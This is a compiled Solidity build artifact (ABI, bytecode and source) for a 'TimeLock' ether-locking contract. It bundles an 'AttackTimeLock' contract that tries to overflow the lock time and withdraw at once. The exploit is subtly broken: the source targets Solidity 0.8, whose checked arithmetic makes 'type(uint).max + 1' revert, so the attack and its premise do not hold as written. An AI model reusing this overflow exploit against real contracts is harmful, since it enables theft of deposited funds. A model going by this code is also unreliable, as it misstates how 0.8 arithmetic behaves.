{
  "contractName": "TimeLock",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "lockTime",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_secondsToIncrease",
          "type": "uint256"
        }
      ],
      "name": "increaseLockTime",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506107f1806100206000396000f3fe60806040526004361061004a5760003560e01c806327e235e31461004f5780633ccfd60b1461008c57806379af55e4146100a3578063a4beda63146100cc578063d0e30db014610109575b600080fd5b34801561005b57600080fd5b50610076600480360381019061007191906104e1565b610113565b6040516100839190610527565b60405180910390f35b34801561009857600080fd5b506100a161012b565b005b3480156100af57600080fd5b506100ca60048036038101906100c5919061056e565b610364565b005b3480156100d857600080fd5b506100f360048036038101906100ee91906104e1565b6103bd565b6040516101009190610527565b60405180910390f35b6101116103d5565b005b60006020528060005260406000206000915090505481565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054116101ac576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101a3906105f8565b60405180910390fd5b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054421161022d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161022490610664565b60405180910390fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555060003373ffffffffffffffffffffffffffffffffffffffff16826040516102da906106b5565b60006040518083038185875af1925050503d8060008114610317576040519150601f19603f3d011682016040523d82523d6000602084013e61031c565b606091505b5050905080610360576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161035790610716565b60405180910390fd5b5050565b80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546103b39190610765565b9250508190555050565b60016020528060005260406000206000915090505481565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546104239190610765565b9250508190555062093a80426104399190610765565b600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104ae82610483565b9050919050565b6104be816104a3565b81146104c957600080fd5b50565b6000813590506104db816104b5565b92915050565b6000602082840312156104f7576104f661047e565b5b6000610505848285016104cc565b91505092915050565b6000819050919050565b6105218161050e565b82525050565b600060208201905061053c6000830184610518565b92915050565b61054b8161050e565b811461055657600080fd5b50565b60008135905061056881610542565b92915050565b6000602082840312156105845761058361047e565b5b600061059284828501610559565b91505092915050565b600082825260208201905092915050565b7f696e73756666696369656e742066756e64730000000000000000000000000000600082015250565b60006105e260128361059b565b91506105ed826105ac565b602082019050919050565b60006020820190508181036000830152610611816105d5565b9050919050565b7f6c6f636b2074696d65206e6f7420657870697265640000000000000000000000600082015250565b600061064e60158361059b565b915061065982610618565b602082019050919050565b6000602082019050818103600083015261067d81610641565b9050919050565b600081905092915050565b50565b600061069f600083610684565b91506106aa8261068f565b600082019050919050565b60006106c082610692565b9150819050919050565b7f6661696c656420746f2073656e64206574686572000000000000000000000000600082015250565b600061070060148361059b565b915061070b826106ca565b602082019050919050565b6000602082019050818103600083015261072f816106f3565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006107708261050e565b915061077b8361050e565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107b0576107af610736565b5b82820190509291505056fea26469706673582212202c01f89a80eb992e990ccb9e78f92353b78792cc0005f93d5171aa996a31ad2464736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"lock time not expired\");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"failed to send ether\");\n    }\n}\n\ncontract AttackTimeLock {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        timeLock.increaseLockTime(type(uint).max + 1 - timeLock.lockTime(address(this)));\n        timeLock.withdraw();\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/TimeLock.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:19:05.940Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}